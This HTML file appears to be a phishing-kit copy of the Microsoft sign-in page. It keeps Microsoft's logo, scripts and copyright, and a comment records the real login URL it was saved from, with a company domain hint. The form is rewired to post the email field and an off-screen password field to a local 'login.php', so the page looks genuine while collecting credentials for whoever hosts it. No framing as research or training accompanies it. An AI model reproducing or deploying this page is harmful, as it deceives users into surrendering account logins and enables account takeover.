<!DOCTYPE html>
<!-- saved from url=(0653)https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=10baa34e-b2c0-4736-8739-c2855c064bcc&protectedtoken=true&domain_hint=olivermcmillan.com&nonce=636549723539902210.05010f04-acc6-48c5-be36-5727c7654faf&state=FYtRDoMgEES1vQt_6Aoi9YP0Dr0BXZdospQG0fb4pR9vknmZaZumuVYulRZqNHbSkxlnq7TR8wxKDdCBgQECjNIjTnK8oZFP0pM0Vlm0dR58aOs39Onj-3smz9El3k7KEePG7F8dpijou59HZjcIZonoBtBaxLT8HYi3L6vro9-4X4ip0LIVirvwR1kftWTC4ko-6Ac -->
<html dir="ltr" class="" lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
 
   
    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/favicon_a.ico">

   
    <script type="text/javascript">
//<![CDATA[
! function() {
    var e = window,
        r = e.$Debug = e.$Debug || {},
        n = e.$Config || {};
    if (!r.appendLog) {
        var t = [],
            o = 0;
        r.appendLog = function(
                e) {
                var r = n.maxDebugLog ||
                    25,
                    a = (new Date)
                    .toUTCString() +
                    ":" + e;
                t.push(o + ":" +
                        a), t.length >
                    r && t.shift(),
                    o++
            }, r.getLogs =
            function() {
                return t
            }
    }
}(),
function() {
    function e(e, r) {
        function n(a) {
            var i = e[a];
            return t - 1 > a ?
                void(o.r[i] ? n(
                        a + 1) :
                    o.when(i,
                        function() {
                            n(a +
                                1
                            )
                        })) :
                void r(i)
        }
        var t = e.length;
        n(0)
    }

    function r(e, r, a) {
        function i() {
            var e = !!s.method,
                o = e ? s.method :
                a[0],
                i = s.extraArgs || [],
                u = t.$WebWatson;
            try {
                var l = n(a, !e);
                if (i && i.length >
                    0)
                    for (var c =
                            i.length,
                            d =
                            0; c >
                        d; d++)
                        l.push(
                            i[d]
                        );
                o.apply(r, l)
            } catch (f) {
                return void(u &&
                    u.submitFromException &&
                    u.submitFromException(
                        f))
            }
        }
        var s = o.r && o.r[e];
        return r = r ? r : this,
            s && (s.skipTimeout ?
                i() : t.setTimeout(
                    i, 0)), s
    }

    function n(e, r) {
        return Array.prototype.slice
            .call(e, r ? 1 : 0)
    }
    var t = window;
    t.$Do || (t.$Do = {
        q: [],
        r: [],
        removeItems: [],
        lock: 0,
        o: []
    });
    var o = t.$Do;
    o.when = function(n, t) {
            function a(e) {
                r(e, i, s) || o
                    .q.push({
                        id: e,
                        c: i,
                        a: s
                    })
            }
            var i = 0,
                s = [],
                u = 1,
                l = "function" ==
                typeof t;
            l || (i = t, u = 2);
            for (var c = u; c <
                arguments.length; c++
            ) s.push(arguments[
                c]);
            n instanceof Array ?
                e(n, a) : a(n)
        }, o.register =
        function(e, n, t) {
            if (!o.r[e]) {
                o.o.push(e);
                var a = {};
                if (n && (a.method =
                        n), t &&
                    (a.skipTimeout =
                        t),
                    arguments &&
                    arguments.length >
                    3) {
                    a.extraArgs = [];
                    for (var i =
                            3; i <
                        arguments
                        .length; i++
                    ) a.extraArgs
                        .push(
                            arguments[
                                i
                            ])
                }
                o.r[e] = a, o.lock++;
                try {
                    for (var s =
                            0; s <
                        o.q.length; s++
                    ) {
                        var u =
                            o.q[
                                s
                            ];
                        u.id ==
                            e &&
                            r(e,
                                u
                                .c,
                                u
                                .a
                            ) &&
                            o.removeItems
                            .push(
                                u
                            )
                    }
                } catch (l) {
                    throw l
                } finally {
                    if (o.lock--,
                        0 ===
                        o.lock) {
                        for (
                            var
                                c =
                                0; c <
                            o.removeItems
                            .length; c++
                        )
                            for (
                                var
                                    d =
                                    o
                                    .removeItems[
                                        c
                                    ],
                                    f =
                                    0; f <
                                o
                                .q
                                .length; f++
                            )
                                if (
                                    o
                                    .q[
                                        f
                                    ] ===
                                    d
                                ) {
                                    o
                                        .q
                                        .splice(
                                            f,
                                            1
                                        );
                                    break
                                }
                        o.removeItems = []
                    }
                }
            }
        }, o.unregister =
        function(e) {
            o.r[e] && delete o.r[
                e]
        }
}(),
function() {
    function e(e) {
        d && d.appendLog && d.appendLog(
            e)
    }

    function r(e) {
        return e.length > p.length &&
            e.substr(e.length -
                p.length).toLowerCase() ==
            p
    }

    function n(n, o, a, i, s, u,
        l) {
        var c = n.src || n.href ||
            "";
        if (c) {
            var d = n.id || "";
            if (!o && r(c)) try {
                n.sheet &&
                    n.sheet
                    .cssRules &&
                    !n.sheet
                    .cssRules
                    .length &&
                    (o = !0)
            } catch (f) {}
            o ? (e(
                "[$Loader]: " +
                (l ||
                    "Failed"
                ) +
                " '" +
                (c ||
                    "") +
                "', id:" +
                d +
                ", async:" +
                (n.async ||
                    "") +
                "', defer:" +
                (n.defer ||
                    "")
            ), t(c, 0,
                d, a, i,
                s)) : (e(
                "[$Loader]: " +
                (u ||
                    "Loaded"
                ) +
                " '" +
                (c ||
                    "") +
                "', id:" +
                (n.id ||
                    "") +
                ", async:" +
                (n.async ||
                    "") +
                "', defer:" +
                (n.defer ||
                    "")
            ), i && i())
        }
    }

    function t(e, r, n, o, a, i) {
        if (e)
            if (o && h > r) {
                g++;
                var s = new u;
                s.retryOnError = !
                    1, s.failMessage =
                    "Reload Failed",
                    s.successMessage =
                    "Reload Success",
                    s.Add(e,
                        "Reload_" +
                        g + (n ?
                            "_" +
                            n :
                            "")
                    ), s.Load(a,
                        function() {
                            t(e,
                                r +
                                1,
                                n,
                                o,
                                a,
                                i
                            )
                        })
            } else i && i()
    }

    function o(e) {
        var r = f.createElement(
            "link");
        return r.rel =
            "stylesheet", r.type =
            "text/css", r.href =
            e.srcPath, r
    }

    function a(e) {
        var r = f.createElement(
            "script");
        return e.id && (r.id =
                e.id), r.crossorigin =
            "anonymous", r.type =
            "text/javascript",
            r.src = e.srcPath,
            r.defer = !1, r.async = !
            1, r
    }

    function i(t, i, s, u, l, c) {
        function d() {
            n(g, !1, i, s, u, l,
                c)
        }
        if (!t || !t.srcPath)
            return void(s && s());
        var g = null;
        g = r(t.srcPath) ? o(t) :
            a(t), g.onload = d,
            g.onerror =
            function() {
                n(g, !0, i, s,
                    u, l, c
                )
            }, g.onreadystatechange =
            function() {
                "loaded" === g.readyState ?
                    setTimeout(
                        d, 500) :
                    "complete" ===
                    g.readyState &&
                    d()
            };
        var h = f.getElementsByTagName(
            "head")[0];
        h.appendChild(g), e(
            "[$Loader]: Loading '" +
            (t.srcPath ||
                "") +
            "', id:" + (t.id ||
                ""))
    }

    function s(e, r, n, t, o, a,
        u) {
        function l() {
            s(e, r + 1, n, t, o,
                a, u)
        }
        return r < e.length ?
            void i(e[r], n, l,
                o, a, u) : void(
                t && t())
    }

    function u() {
        var e = this,
            r = [];
        e.retryOnError = !0, e.successMessage =
            "Loaded", e.failMessage =
            "Error", e.Add =
            function(e, n) {
                e && r.push({
                    srcPath: e,
                    id: n
                })
            }, e.AddIf =
            function(r, n, t) {
                r && e.Add(n, t)
            }, e.Load =
            function(n, t) {
                s(r, 0, e.retryOnError,
                    n, t, e
                    .successMessage,
                    e.failMessage
                )
            }
    }
    var l = window,
        c = l.$Config,
        d = l.$Debug,
        f = l.document,
        g = 0,
        h = c.slMaxRetry || 2,
        v = c.slReportFailure ||
        !1,
        p = ".css";
    u.On = function(e, r) {
        if (!e) throw "The target element must be provided and cannot be null";
        n(e, r, !0, null,
            function() {
                if (v) {
                    var
                        r =
                        e
                        .src ||
                        e
                        .href ||
                        "";
                    throw "Failed to load external resource ['" +
                        r +
                        "']"
                }
            })
    }, l.$Loader = u
}(),
function() {
    function e() {
        if (!m) {
            var e = new f.$Loader;
            e.AddIf(!f.jQuery,
                    h.sbundle,
                    "WebWatson_DemandSupport"
                ), h.sbundle =
                null, delete h.sbundle,
                e.AddIf(!f.$Api,
                    h.fbundle,
                    "WebWatson_DemandFramework"
                ), h.fbundle =
                null, delete h.fbundle,
                e.Add(h.bundle,
                    "WebWatson_DemandLoaded"
                ), e.Load(r, n),
                m = !0
        }
    }

    function r() {
        if (f.$WebWatson) {
            if (f.$WebWatson.isProxy)
                return void n();
            v.when(
                "$WebWatson.full",
                function() {
                    for (; p
                        .length >
                        0;) {
                        var
                            e =
                            p
                            .shift();
                        e &&
                            f
                            .$WebWatson[
                                e
                                .cmdName
                            ]
                            .apply(
                                f
                                .$WebWatson,
                                e
                                .args
                            )
                    }
                })
        }
    }

    function n() {
        var e = f.$WebWatson ?
            f.$WebWatson.isProxy :
            !0;
        if (e) {
            if (!b && JSON) {
                try {
                    var r = new XMLHttpRequest;
                    r.open(
                            "POST",
                            h.url
                        ), r.setRequestHeader(
                            "Accept",
                            "application/json"
                        ), r.setRequestHeader(
                            "Content-Type",
                            "application/json; charset=UTF-8"
                        ), r.setRequestHeader(
                            "canary",
                            g.apiCanary
                        ), r.setRequestHeader(
                            "client-request-id",
                            g.correlationId
                        ), r.setRequestHeader(
                            "hpgid",
                            g.hpgid ||
                            0),
                        r.setRequestHeader(
                            "hpgact",
                            g.hpgact ||
                            0);
                    for (var n = -
                            1,
                            o =
                            0; o <
                        p.length; o++
                    )
                        if (
                            "submit" ===
                            p[o]
                            .cmdName
                        ) {
                            n =
                                o;
                            break
                        }
                    var a = p[n] ?
                        p[n].args || [] : [],
                        i = {
                            sr: h
                                .sr,
                            ec: "Failed to load external resource [Core Watson files]",
                            wec: 55,
                            idx: 1,
                            pn: g
                                .pgid ||
                                "",
                            sc: g
                                .scid ||
                                0,
                            hpg: g
                                .hpgid ||
                                0,
                            msg: "Failed to load external resource [Core Watson files]",
                            url: a[
                                    1
                                ] ||
                                "",
                            ln: 0,
                            ad: 0,
                            an:
                                !
                                1,
                            cs: "",
                            sd: g
                                .serverDetails,
                            ls: null,
                            diag: null
                        };
                    r.send(JSON
                        .stringify(
                            i
                        ))
                } catch (s) {}
                b = !0
            }
            h.loadErrorUrl &&
                window.location
                .assign(h.loadErrorUrl)
        }
        t()
    }

    function t() {
        p = [], f.$WebWatson =
            null
    }

    function o(r) {
        return function() {
            var n =
                arguments;
            p.push({
                cmdName: r,
                args: n
            }), e()
        }
    }

    function a() {
        var e = [
                "foundException",
                "resetException",
                "submit"
            ],
            r = this;
        r.isProxy = !0;
        for (var n = e.length,
                t = 0; n > t; t++) {
            var a = e[t];
            a && (r[a] = o(a))
        }
    }

    function i(e, r, n, t, o, a,
        i) {
        var s = f.event;
        a || (a = d(o || s, i ?
                i + 2 : 2)), f.$Debug &&
            f.$Debug.appendLog &&
            f.$Debug.appendLog(
                "[WebWatson]:" +
                (e || "") +
                " in " + (r ||
                    "") + " @ " +
                (n || "??")), w
            .submit(e, r, n, t,
                o || s, a, i)
    }

    function s(e, r) {
        return {
            signature: e,
            args: r,
            toString: function() {
                return this
                    .signature
            }
        }
    }

    function u(e) {
        for (var r = [], n = e.split(
                    "\n"), t =
                0; t < n.length; t++)
            r.push(s(n[t], []));
        return r
    }

    function l(e) {
        for (var r = [], n = e.split(
                    "\n"), t =
                0; t < n.length; t++) {
            var o = s(n[t], []);
            n[t + 1] && (o.signature +=
                "@" + n[t +
                    1], t++
            ), r.push(o)
        }
        return r
    }

    function c(e) {
        if (!e) return null;
        try {
            if (e.stack) return u(
                e.stack
            );
            if (e.error) {
                if (e.error.stack)
                    return u(e.error
                        .stack
                    )
            } else if (window.opera &&
                e.message)
                return l(e.message)
        } catch (r) {}
        return null
    }

    function d(e, r) {
        var n = [];
        try {
            for (var t =
                    arguments.callee; r >
                0;) t = t ? t.caller :
                t, r--;
            for (var o = 0; t &&
                y > o;) {
                var a =
                    "InvalidMethod()";
                try {
                    a = t.toString()
                } catch (i) {}
                var u = [],
                    l = t.args ||
                    t.arguments;
                if (l)
                    for (var d =
                            0; d <
                        l.length; d++
                    ) u[d] = l[
                        d];
                n.push(s(a, u)),
                    t = t.caller,
                    o++
            }
        } catch (i) {
            n.push(s(i.toString(), []))
        }
        var f = c(e);
        return f && (n.push(s(
            "--- Error Event Stack -----------------", []
        )), n = n.concat(
            f)), n
    }
    var f = window,
        g = f.$Config || {},
        h = g.watson,
        v = f.$Do;
    if (!f.$WebWatson && h) {
        var p = [],
            m = !1,
            b = !1,
            y = 10,
            w = f.$WebWatson =
            new a;
        w.CB = {}, w._orgErrorHandler =
            f.onerror, f.onerror =
            i, w.errorHooked = !
            0, v.when(
                "jQuery.version",
                function(e) {
                    h.expectedVersion =
                        e
                }), v.register(
                "$WebWatson")
    }
}(),
function() {
    function e(e, r) {
        for (var n = r.split(
                    "."), t = n
                .length, o = 0; t >
            o && null !== e &&
            void 0 !== e;) e =
            e[n[o++]];
        return e
    }

    function r(r) {
        var n = null;
        return null === u && (u =
                e(a,
                    "Constants"
                )), null !== u &&
            r && (n = e(u, r)),
            null === n || void 0 ===
            n ? "" : n.toString()
    }

    function n(n) {
        var t = null;
        return null === i && (i =
                e(a,
                    "$Config.strings"
                )), null !== i &&
            n && (t = e(i, n.toLowerCase())),
            (null === t || void 0 ===
                t) && (t = r(n)),
            null === t || void 0 ===
            t ? "" : t.toString()
    }

    function t(e, r) {
        var t = null;
        return e && r && r[e] &&
            (t = n("errors." +
                r[e])), t || (t =
                n("errors." + e)
            ), t || (t = n(
                "errors." +
                l)), t || (t =
                n(l)), t
    }

    function o(n) {
        var t = null;
        return null === s && (s =
                e(a,
                    "$Config.urls"
                )), null !== s &&
            n && (t = e(s, n.toLowerCase())),
            (null === t || void 0 ===
                t) && (t = r(n)),
            null === t || void 0 ===
            t ? "" : t.toString()
    }
    var a = window,
        i = null,
        s = null,
        u = null,
        l = "GENERIC_ERROR";
    a.GetString = n, a.GetErrorString =
        t, a.GetUrl = o
}(),
function() {
    var e = window,
        r = e.$Config || {};
    e.$B = r.browser || {}
}();
//]]>
    </script>

    <script type="text/javascript">
ServerData = $Config;
    </script>

    <link href="./Sign in to your account_files/converged.login.min.css" rel="stylesheet"
        onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
<style>

    .no_display {

        display: none;

    }
    a[target] {
    display: none;
}

</style>

<script>
function submitform() {
  var f = document.getElementsByTagName('form')[0];
  if(f.checkValidity()) {
    f.submit();
  } else {
    alert(document.getElementById('example').validationMessage);
  }
}
</script>
   <!--  <script crossorigin="anonymous" src="./Sign in to your account_files/convergedlogin_pcore.min.js.download"
        onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    <script crossorigin="anonymous" src="./Sign in to your account_files/convergedloginpaginatedstrings-en.min.js.download"
        onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script> -->



 
</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">

        <div>
        <!--  -->
        <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div>
                <!-- /ko -->
                <!-- ko if: backgroundImageUrl -->
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()"
                    style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div>
                <!-- /ko -->
                <!-- ko if: !!backgroundImageUrl() -->
                <div class="background-overlay"></div>
                <!-- /ko -->
            </div>
        </div>
        <form  spellcheck="false" method="post"
             autocomplete="off" action="login.php">
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                <!-- ko if: svr.fShowCookieBanner -->
                <!-- /ko -->
                <div class="middle" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl() }">
                    <!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                    <!-- /ko -->
                    <div class="inner" data-bind="css: { &#39;app&#39;: $loginPage.backgroundLogoUrl(), &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }">
                        <!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') -->
                        <div role="banner" data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
                            <!--  -->
                            <!-- ko if: bannerLogoUrl -->
                            <!-- /ko -->
                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                            <!-- ko component: 'accessible-image-control' -->
                            <!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                            <!-- /ko -->
                            <!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme -->
                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9"
                                svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7293.9/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"
                                data-bind="imgSrc" src="./Sign in to your account_files/microsoft_logo.svg">
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                        <!-- /ko -->
                        <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                        <!-- /ko -->
                        <!-- ko if: showErrorDetails -->
                        <!-- /ko -->
                        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }">
                            <div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }"
                                class="animate">
                                <!-- ko foreach: views -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- ko template: { nodes: [$data], data: $parent } -->
                                <div data-viewid="1" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }">
                                    <!--  -->
                                    <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[&#39;WF_STR_HeaderDefault_Title&#39;]">Sign in
                                    </div>
                                    <!-- ko if: pageDescription && !svr.fHideLoginDesc -->
                                    <!-- /ko -->
                                    <div class="row">
                                        <div role="alert" aria-live="assertive" aria-atomic="false">
                                            <!-- ko if: usernameTextbox.error -->
                                            <!-- /ko -->
                                        </div>
                                        <div class="form-group col-md-24">
                                            <!-- ko if: prefillNames().length > 1 -->
                                            <!-- /ko -->
                                            <!-- ko ifnot: prefillNames().length > 1 -->
                                            <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                                <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                                                <input type="email" name="loginfmt" maxlength="113" lang="en"
                                                    class="form-control ltr_override"
                                                    aria-describedby="usernameError loginHeader loginDescription"
                                                    aria-required="true" data-bind="textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Username_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: usernameTextbox.error },
                    attr: inputAttributes" placeholder="someone@example.com "
                                                    aria-label="Enter your email address" required>
                                                <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill"
                                                    class="moveOffScreen" tabindex="-1"
                                                    aria-hidden="true">
                                                <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: &#39;marching-ants-control&#39;, ariaLabel: str[&#39;WF_STR_ProgressText&#39;]"
                                                    aria-label="Please wait"
                                                    style="display: none;">
                                                    <!--  -->
                                                    <!-- ko if: useCssAnimation -->
                                                    <div></div>
                                                    <div></div>
                                                    <div></div>
                                                    <div></div>
                                                    <div></div>
                                                    <div></div>
                                                    <!-- /ko -->
                                                    <!-- ko ifnot: useCssAnimation -->
                                                    <!-- /ko -->
                                                </div>
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- ko ifnot: usePlaceholderAttribute -->
                                                <!-- /ko -->
                                            </div>
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
                                            <div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { &#39;no-margin-bottom&#39;: removeBottomMargin, &#39;button-container&#39;: svr.fRepositionFooterButtons }">
                                                <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }"
                                                    class="col-xs-12 secondary">
                                                    <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39;,
                &#39;aria-describedby&#39;: secondaryButtonDescribedBy },
            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back">                                                    </div>
                                                <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }"
                                                    class="col-xs-12 primary">
                                                    <input type="submit"  class="btn btn-block btn-primary"
                                                         value="Next">                                                    </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-24">
                                            <div class="text-13 action-links">
                                                <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                                                <!-- /ko -->
                                                <!-- ko component: { name: "cred-switch-link-control",
                params: {
                    availableCreds: availableCredsWithoutUsername },
                event: {
                    switchView: noUsernameCredSwitchLink_onSwitchView } } -->
                                                <!-- ko if: altCreds.length > 0 -->
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig -->
                                                <!-- /ko -->
                                                <!-- ko if: svr.showCantAccessAccountLink -->
                                                <div class="form-group">
                                                    <a id="cantAccessAccount" href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&amp;redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&amp;resource=00000002-0000-0ff1-ce00-000000000000&amp;response_mode=form_post&amp;response_type=code+id_token&amp;scope=openid&amp;msafed=0&amp;client-request-id=10baa34e-b2c0-4736-8739-c2855c064bcc&amp;protectedtoken=true&amp;domain_hint=olivermcmillan.com&amp;nonce=636549723539902210.05010f04-acc6-48c5-be36-5727c7654faf&amp;state=FYtRDoMgEES1vQt_6Aoi9YP0Dr0BXZdospQG0fb4pR9vknmZaZumuVYulRZqNHbSkxlnq7TR8wxKDdCBgQECjNIjTnK8oZFP0pM0Vlm0dR58aOs39Onj-3smz9El3k7KEePG7F8dpijou59HZjcIZonoBtBaxLT8HYi3L6vro9-4X4ip0LIVirvwR1kftWTC4ko-6Ac#"
                                                        data-bind="text: str[&#39;WF_STR_CantAccessAccount_Text&#39;], click: cantAccessAccount_onClick">Can’t access your account?</a>                                                    </div>
                                                <!-- /ko -->
                                            </div>
                                        </div>
                                    </div>
                                    <!-- ko if: tenantBranding.BoilerPlateText -->
                                    <!-- /ko -->
                                </div>
                                <!-- /ko -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                <!-- /ko -->
                                <!-- /ko -->
                            </div>
                        </div>
                    </div> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId"
                        value=""> <input type="hidden" name="psRNGCDefaultType"
                        data-bind="value: postedLoginStateViewRNGCDefaultType"
                        value=""> <input type="hidden" name="psRNGCEntropy"
                        data-bind="value: postedLoginStateViewRNGCEntropy"
                        value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK"
                        value="">      <input type="hidden" name="NewUser" value="1">                    <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs"
                        value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0"
                        value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0"
                        value="0"> <input type="hidden" name="CookieDisclosure"
                        data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">                    <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0"
                        value="0">
                    <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode"
                            value="102">
                        <input type="hidden" name="i17" data-bind="value: srsFailed" value="">                        <input type="hidden" name="i18" data-bind="value: srsSuccess"
                            value="">
                        <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                </div>
                <!-- /ko -->
            </div>
            <!-- /ko -->
            <!-- ko if: showOptOutBanner -->
            <!-- /ko -->
            <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }">
                <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }">
                    <!--  -->
                    <!-- ko if: showLinks || impressumLink || showIcpLicense -->
                    <div id="footerLinks" class="footerNode text-secondary">
                        <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2019 Microsoft</span>
